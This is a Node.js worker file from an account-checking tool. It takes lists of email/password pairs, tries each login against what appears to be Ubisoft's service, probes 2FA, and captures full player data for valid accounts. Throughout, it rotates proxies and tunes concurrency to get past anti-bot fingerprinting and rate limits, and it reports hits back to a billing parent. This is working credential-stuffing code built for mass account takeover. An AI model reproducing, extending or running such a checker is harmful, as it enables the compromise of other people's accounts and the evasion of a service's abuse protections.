// Bulk-check worker child process. The main bulkRunner forks N of these (one
// per CPU core) and hands each its own chunk of accounts. Each child runs an
// in-process concurrency pool (so each gets its OWN libuv pool + event loop)
// and streams formatted result lines back to the parent via IPC, where billing,
// disk writes, counter updates, and DB bumps happen.

// Faithful copy of the in-process worker semantics from bulkRunner.js so
// outcomes match exactly. Run with:
//   node lib/checker/bulkWorker.js   (forked by child_process.fork)

const { login, check2FA } = require('../auth');
const { getPlayerData } = require('../player');
const fmt = require('./resultFormat');
// Each forked child has its OWN governor singleton (separate process = separate
// libuv pool + separate Ubi anti-bot fingerprint budget). Gating this child's
// pool with it makes the ADAPTIVE concurrency + circuit breaker apply to the
// REAL production path (BULK_WORKERS>1 forks these children) — not just the
// in-process path. Parent sizes each child's governor via env at fork time.
const { gov } = require('./rateGovernorInstance');

const PER_WORKER_CONCURRENCY = Math.max(1, Number(process.env.BULK_WORKER_CONCURRENCY) || 125);
const NET_RETRIES = Math.max(0, Number(process.env.BULK_NETWORK_RETRIES) || 3);
const CHECK_TIMEOUT_MS = Math.max(5000, Number(process.env.CHECK_TIMEOUT_MS) || 60_000);
const DATA_RETRIES = Math.max(0, Number(process.env.BULK_DATA_RETRIES) || 5);
const CHECK_2FA = process.env.BULK_CHECK_2FA !== 'false';
// Never-skip slow lane (mirrors bulkRunner): deferred transient failures get
// retried in rounds before any terminal ERROR is emitted.
const SLOW_ROUNDS = Math.max(0, Number(process.env.BULK_SLOW_RETRIES) || 8);
const SLOW_MS = Math.max(1000, Number(process.env.BULK_SLOW_MS) || 30_000);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
function isPlausibleEmail(e) { return typeof e === 'string' && /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(e); }

function withTimeout(promise, ms, msg) {
  return Promise.race([
    promise,
    new Promise((_, rej) => setTimeout(() => rej(new Error(msg || 'timeout')), ms)),
  ]);
}

// IDENTICAL semantics to the in-process bulkRunner.checkOne (single source of
// truth for outcomes). A confirmed valid login is ONLY recorded with FULL data
// — if getPlayerData keeps failing we bounce to the outer retry loop (a fresh
// proxy + fingerprint), and if that ALSO exhausts we record ERROR_NETWORK
// (non-billable, non-recorded) rather than a partial.
async function checkOne(email, password, proxyUrl) {
  if (!isPlausibleEmail(email)) return { outcome: 'invalid' };
  let session;
  try {
    session = await login(email, password, proxyUrl ? { proxyUrl } : {});
  } catch (loginError) {
    return { outcome: fmt.decideOutcome({ loginError }) };
  }
  // Fire-and-forget session teardown after we're done — mirrors bulkRunner.
  // See lib/auth.js:logout. Toggle with BULK_UBI_LOGOUT=0.
  const { logout } = require('../auth');
  try {
    // Parallel 2FA probe — adds ~no wall-clock since it shares the ticket.
    const twoFaP = CHECK_2FA
      ? withTimeout(check2FA(session.ticket, session.sessionId, proxyUrl ? { proxyUrl } : {}), 4000, '2fa timeout').then(v => v, () => undefined)
      : Promise.resolve(undefined);
    let playerData = null;
    for (let i = 0; i <= DATA_RETRIES; i++) {
      try {
        playerData = await getPlayerData(session.userId, session.ticket, session.sessionId, session.appId, { bulk: true, forceRefresh: true });
        break;
      } catch (e) {
        if (i < DATA_RETRIES) { await new Promise(r => setTimeout(r, 300 + i * 400)); continue; }
      }
    }
    if (!playerData) return { outcome: 'retry' };   // bounce to outer loop — NEVER a partial
    const twoFactor = await twoFaP;
    if (twoFactor !== undefined) playerData.twoFactor = twoFactor;
    if (!fmt.isCaptureComplete(playerData)) return { outcome: 'retry' };
    return { outcome: 'success', playerData };
  } finally {
    try { logout(session, proxyUrl); } catch {}
  }
}

let aborted = false;
let accounts = [];
let proxies = null;
let started = false;

process.on('message', (msg) => {
  if (!msg || typeof msg !== 'object') return;
  if (msg.type === 'init' && !started) {
    started = true;
    accounts = Array.isArray(msg.accounts) ? msg.accounts : [];
    proxies = (Array.isArray(msg.proxies) && msg.proxies.length) ? msg.proxies : null;
    runChunk().then(() => {
      try { process.send({ type: 'done' }); } catch {}
    }).catch((e) => {
      try { process.send({ type: 'fatal', error: e.message }); } catch {}
      process.exit(1);
    });
  }
  if (msg.type === 'abort') aborted = true;
});

async function runChunk() {
  let cursor = 0;
  const total = accounts.length;
  const deferred = [];   // transient failures handed to the slow lane

  // Fast-lane attempt: up to NET_RETRIES+1 tries on rotating proxies/IPs.
  async function attemptAccount(acc, idxSeed) {
    let outcome, playerData;
    for (let attempt = 0; attempt <= NET_RETRIES; attempt++) {
      const proxyUrl = (proxies && proxies.length) ? proxies[(idxSeed + attempt) % proxies.length] : null;
      try {
        const r = await withTimeout(checkOne(acc.email, acc.password, proxyUrl), CHECK_TIMEOUT_MS, 'check timeout');
        outcome = r.outcome; playerData = r.playerData;
      } catch (e) { outcome = 'network'; }
      if (outcome !== 'network' && outcome !== 'retry') break;
      if (attempt < NET_RETRIES && !aborted) await sleep(400 + attempt * 600);
    }
    return { outcome, playerData };
  }

  // Emit a DEFINITIVE result line back to the parent (which bills/writes/counts).
  function emit(acc, outcome, playerData) {
    if (aborted) return;
    const line = fmt.formatLine(acc.email, acc.password, outcome, playerData);
    try { process.send({ type: 'result', email: acc.email, outcome, line }); } catch { /* parent disconnected */ aborted = true; }
  }

  const workers = [];
  for (let i = 0; i < PER_WORKER_CONCURRENCY; i++) {
    workers.push((async () => {
      while (cursor < total && !aborted) {
        // Governor gate: blocks while the circuit breaker is open and caps live
        // concurrency at the adaptively-tuned limit. Parked coroutines wait on a
        // queue (no busy-poll). release() in finally always frees the slot.
        await gov.acquire();
        try {
          if (aborted) break;
          const idx = cursor++;
          if (idx >= total) break;   // another coroutine took the last item
          const acc = accounts[idx];
          const r = await attemptAccount(acc, idx);
          if (aborted) continue;
          if (r.outcome === 'network' || r.outcome === 'retry') deferred.push({ acc, idx });
          else emit(acc, r.outcome, r.playerData);
        } finally {
          gov.release();
        }
      }
    })());
  }
  await Promise.all(workers);

  // Never-skip: retry the deferred transient failures in bounded rounds before
  // any terminal ERROR is emitted, so no line is dropped on a momentary blip.
  if (deferred.length && !aborted) {
    const { drainSlowLane } = require('./neverSkip');
    await drainSlowLane(deferred, {
      attempt: (item, round) => attemptAccount(item.acc, item.idx + round * 7),
      record: (item, outcome, pd) => emit(item.acc, outcome, pd),
      sleep, concurrency: PER_WORKER_CONCURRENCY,
      aborted: () => aborted,
      acquire: () => gov.acquire(), release: () => gov.release(),
    }, { rounds: SLOW_ROUNDS, delayMs: SLOW_MS });
  }
}

// On parent disconnect (normal end OR crash) stop all in-flight work and exit
// — keeps zombie children from lingering after a job completes or is cancelled.
process.on('disconnect', () => { aborted = true; setTimeout(() => process.exit(0), 250).unref(); });
